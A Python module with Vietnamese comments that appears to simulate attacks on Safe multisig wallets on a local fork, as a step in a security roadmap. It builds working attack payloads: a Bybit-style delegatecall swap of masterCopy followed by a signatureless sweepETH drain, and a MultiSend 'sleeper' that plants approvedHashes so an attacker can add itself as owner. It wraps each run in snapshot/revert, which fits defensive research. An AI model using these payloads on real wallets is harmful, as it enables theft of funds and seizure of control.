"""
consequences.py — Roadmap bước 6: chứng minh HẬU QUẢ thực tế sau tấn công.

Ý tưởng: sau khi mô phỏng một giao dịch, cho kẻ tấn công "thử khai thác" ngay
trên fork (bọc trong snapshot/revert). Nếu khai thác thành công → bằng chứng
cụ thể thay vì chỉ "storage bị đổi".

  - check_drain    (S2): masterCopy đã trỏ sang MaliciousImpl → attacker gọi
                         thẳng Safe.sweepETH(attacker), không cần chữ ký nào.
  - check_backdoor (S6): SleeperImpl đã cài approvedHashes[owner][h] = 1 →
                         attacker gửi execTransaction với chữ ký v=1 của các
                         owner "đã duyệt" và tự thêm mình làm owner, threshold=1.

Lưu ý về S6: SleeperImpl.transfer(owner, txHash) chỉ cài cho MỘT owner mỗi lần
gọi. Với Safe 2/3 cần cài cho đủ `threshold` owner, nên build_s6_multisend()
gói nhiều lần gọi vào MultiSend (delegatecall → delegatecall), đúng kiểu batch
mà giao diện Safe vẫn hay tạo.
"""

import os

from eth_abi import encode
from web3 import Web3
from web3.exceptions import ContractLogicError

from simulator import (SAFE_EXEC_ABI, ZERO, RPC_DEFAULT, snapshot, revert,
                       simulate_safe_tx, build_approved_signatures,
                       _impersonate, _stop_impersonate)
from state_reader import read_state, load_env

ATTACKER_DEFAULT = "0xa0Ee7A142d267C1f36714E4a8F75612F20a79720"   # Anvil #9
SLEEPER_DEFAULT = "0xE415bd019479000C71147adE4C74C1f4B36B1478"
MULTISEND_141 = "0x38869bf66a61cF6bDB996A6aE40D5853Fd43B526"      # Safe v1.4.1 MultiSend
SWEEP_ETH_SIG = "sweepETH(address)"   # kiểm tra lại cho khớp MaliciousImpl.sol

SAFE_ABI = SAFE_EXEC_ABI + [
    {"inputs": [{"name": "", "type": "address"}, {"name": "", "type": "bytes32"}],
     "name": "approvedHashes", "outputs": [{"type": "uint256"}],
     "stateMutability": "view", "type": "function"},
]


def _sel(sig: str) -> bytes:
    """4 byte selector của một hàm, ví dụ 'transfer(address,uint256)'."""
    return bytes(Web3.keccak(text=sig)[:4])


def _safe(w3: Web3, addr: str):
    return w3.eth.contract(address=Web3.to_checksum_address(addr), abi=SAFE_ABI)


# ---------------------------------------------------------------- dựng giao dịch

def takeover_tx(safe_address: str, attacker: str) -> dict:
    """Giao dịch 'chiếm quyền': Safe tự gọi addOwnerWithThreshold(attacker, 1)."""
    data = _sel("addOwnerWithThreshold(address,uint256)") + encode(
        ["address", "uint256"], [Web3.to_checksum_address(attacker), 1])
    return {"to": Web3.to_checksum_address(safe_address), "value": 0,
            "data": data, "operation": 0}


def safe_tx_hash(w3: Web3, safe_address: str, tx: dict, nonce: int) -> bytes:
    """safeTxHash của tx tại một nonce cụ thể (tính trước được cho nonce tương lai)."""
    safe = _safe(w3, safe_address)
    return bytes(safe.functions.getTransactionHash(
        tx["to"], tx["value"], tx["data"], tx["operation"],
        0, 0, 0, ZERO, ZERO, nonce).call())


def build_s6_multisend(sleeper: str, owners: list[str], h: bytes) -> tuple[str, str, int]:
    """
    Payload S6: Safe delegatecall MultiSend, MultiSend delegatecall SleeperImpl
    một lần cho mỗi owner → cài approvedHashes[owner][h] = 1 trong storage Safe.
    Trả về (to, data_hex, operation).
    """
    sleeper = Web3.to_checksum_address(sleeper)
    packed = b""
    for o in owners:
        inner = _sel("transfer(address,uint256)") + encode(
            ["address", "uint256"], [Web3.to_checksum_address(o), int.from_bytes(h, "big")])
        packed += (bytes([1])                              # operation = delegatecall
                   + bytes.fromhex(sleeper[2:])            # to (20 byte)
                   + (0).to_bytes(32, "big")               # value
                   + len(inner).to_bytes(32, "big")        # độ dài data
                   + inner)
    data = _sel("multiSend(bytes)") + encode(["bytes"], [packed])
    return MULTISEND_141, "0x" + data.hex(), 1


# ---------------------------------------------------------------- kiểm tra hậu quả

def check_drain(w3: Web3, safe_address: str, attacker: str, fund_eth: int = 10) -> dict:
    """Nạp ETH cho Safe rồi để attacker gọi sweepETH(attacker) KHÔNG kèm chữ ký."""
    safe_address = Web3.to_checksum_address(safe_address)
    attacker = Web3.to_checksum_address(attacker)
    w3.provider.make_request("anvil_setBalance", [safe_address, hex(fund_eth * 10**18)])
    bal_before = w3.eth.get_balance(safe_address)

    data = _sel(SWEEP_ETH_SIG) + encode(["address"], [attacker])
    status = 0
    _impersonate(w3, attacker)
    try:
        h = w3.eth.send_transaction({"from": attacker, "to": safe_address,
                                     "data": "0x" + data.hex(), "gas": 200_000})
        status = w3.eth.wait_for_transaction_receipt(h).status
    except Exception as e:                       # revert khi masterCopy vẫn là Safe thật
        print(f"    (sweepETH bị từ chối: {str(e)[:80]})")
    finally:
        _stop_impersonate(w3, attacker)

    bal_after = w3.eth.get_balance(safe_address)
    drained = bal_before - bal_after
    return {
        "check": "drain",
        "consequence": "FUNDS_DRAINED" if status == 1 and drained > 0 else "NONE",
        "status": status,
        "drained_eth": drained / 10**18,
    }


def check_backdoor(w3: Web3, safe_address: str, attacker: str, tx: dict) -> dict:
    """
    Đếm owner đã có approvedHashes cho tx (tại nonce hiện tại). Nếu đủ threshold,
    attacker tự gửi execTransaction với chữ ký v=1 → kiểm tra có chiếm quyền được không.
    """
    safe_address = Web3.to_checksum_address(safe_address)
    attacker = Web3.to_checksum_address(attacker)
    safe = _safe(w3, safe_address)

    try:
        nonce = safe.functions.nonce().call()
        h = safe_tx_hash(w3, safe_address, tx, nonce)
        owners = safe.functions.getOwners().call()
        threshold = safe.functions.getThreshold().call()
        planted = [o for o in owners if safe.functions.approvedHashes(o, h).call() != 0]
    except ContractLogicError:
        # masterCopy đã bị thay: proxy không còn trả lời ABI của Safe
        # → owners mất hẳn quyền điều khiển (không còn execTransaction để ký)
        return {"check": "backdoor", "consequence": "SAFE_BRICKED",
                "planted": [], "threshold": None}

    result = {"check": "backdoor", "planted": planted, "threshold": threshold,
              "safe_tx_hash": "0x" + h.hex()}
    if len(planted) < threshold:
        # Cài được một phần vẫn nguy hiểm: chỉ cần thêm (threshold - k) chữ ký thật
        result["consequence"] = "PARTIAL_BACKDOOR" if planted else "NONE"
        return result

    sigs = build_approved_signatures(planted[:threshold])
    status = 0
    _impersonate(w3, attacker)
    try:
        th = safe.functions.execTransaction(
            tx["to"], tx["value"], tx["data"], tx["operation"],
            0, 0, 0, ZERO, ZERO, sigs).transact({"from": attacker, "gas": 3_000_000})
        status = w3.eth.wait_for_transaction_receipt(th).status
    finally:
        _stop_impersonate(w3, attacker)

    owners_after = safe.functions.getOwners().call()
    taken = status == 1 and attacker in owners_after
    result.update({
        "consequence": "TAKEOVER_WITHOUT_SIGNATURES" if taken else "BACKDOOR_FAILED",
        "status": status,
        "owners_after": owners_after,
        "threshold_after": safe.functions.getThreshold().call(),
    })
    return result


def run_consequence_checks(w3: Web3, safe_address: str, attacker: str) -> list[dict]:
    """Chạy mọi phép thử hậu quả trên state hiện tại (gọi SAU khi mô phỏng tx).
    Mỗi phép thử tự bọc snapshot/revert nên không ảnh hưởng lẫn nhau."""
    results = []
    for fn, args in [(check_drain, (w3, safe_address, attacker)),
                     (check_backdoor, (w3, safe_address, attacker,
                                       takeover_tx(safe_address, attacker)))]:
        snap = snapshot(w3)
        try:
            results.append(fn(*args))
        finally:
            revert(w3, snap)
    return results


# ---------------------------------------------------------------- demo

def _invariants(st: dict) -> tuple:
    return (st.get("masterCopy"), tuple(st.get("owners", [])), st.get("threshold"),
            tuple(st.get("modules", [])), st.get("fallbackHandler"), st.get("guard"))


if __name__ == "__main__":
    env = load_env()
    rpc = os.getenv("RPC_URL", RPC_DEFAULT)
    w3 = Web3(Web3.HTTPProvider(rpc, request_kwargs={"timeout": 60}))
    safe_addr = Web3.to_checksum_address(env["SAFE_ADDRESS"])
    mal = Web3.to_checksum_address(env["MALICIOUS_IMPL"])
    sleeper = Web3.to_checksum_address(env.get("SLEEPER_IMPL", SLEEPER_DEFAULT))
    attacker = Web3.to_checksum_address(env.get("ATTACKER", ATTACKER_DEFAULT))
    safe = _safe(w3, safe_addr)

    if w3.eth.get_code(Web3.to_checksum_address(MULTISEND_141)) in (b"", b"\x00"):
        raise SystemExit(f"MultiSend chưa có trên fork tại {MULTISEND_141} — "
                         "chép bytecode từ Sepolia bằng anvil_setCode trước khi chạy.")

    # S6 phải cài hash của giao dịch chiếm quyền ở nonce SAU giao dịch S6 (n+1)
    n = safe.functions.nonce().call()
    owners = safe.functions.getOwners().call()
    thr = safe.functions.getThreshold().call()
    follow = takeover_tx(safe_addr, attacker)
    s6_to, s6_data, s6_op = build_s6_multisend(
        sleeper, owners[:thr], safe_tx_hash(w3, safe_addr, follow, n + 1))

    scenarios = [
        ("S1 Hợp lệ: gọi rỗng (operation=0)",
         "0x70997970C51812dc3A010C7d01b50e0d17dc79C8", "0x", 0),
        ("S2 Bybit: delegatecall transfer() ngụy trang",
         mal, "0xa9059cbb" + encode(["address", "uint256"], [mal, 0]).hex(), 1),
        ("S6 Sleeper: MultiSend cài approvedHashes",
         s6_to, s6_data, s6_op),
    ]

    for label, to, data, op in scenarios:
        print(f"\n=== {label} ===")
        snap = snapshot(w3)
        try:
            before = read_state(rpc, safe_addr)
            res = simulate_safe_tx(w3, safe_addr, to, data, 0, op)
            after = read_state(rpc, safe_addr)
            same = _invariants(before) == _invariants(after)
            print(f"  status tx      : {res['status']}")
            print(f"  invariants     : {'KHÔNG đổi' if same else 'ĐÃ ĐỔI'}")
            for r in run_consequence_checks(w3, safe_addr, attacker):
                if r["check"] == "drain":
                    extra = f"rút {r['drained_eth']} ETH"
                elif r["consequence"] == "SAFE_BRICKED":
                    extra = "proxy không còn trả lời ABI Safe"
                else:
                    extra = f"cài {len(r['planted'])}/{r['threshold']} owner"
                print(f"  [{r['check']:8}] {r['consequence']:28} ({extra})")
        finally:
            revert(w3, snap)

    print(f"\nSau revert: nonce={safe.functions.nonce().call()}")
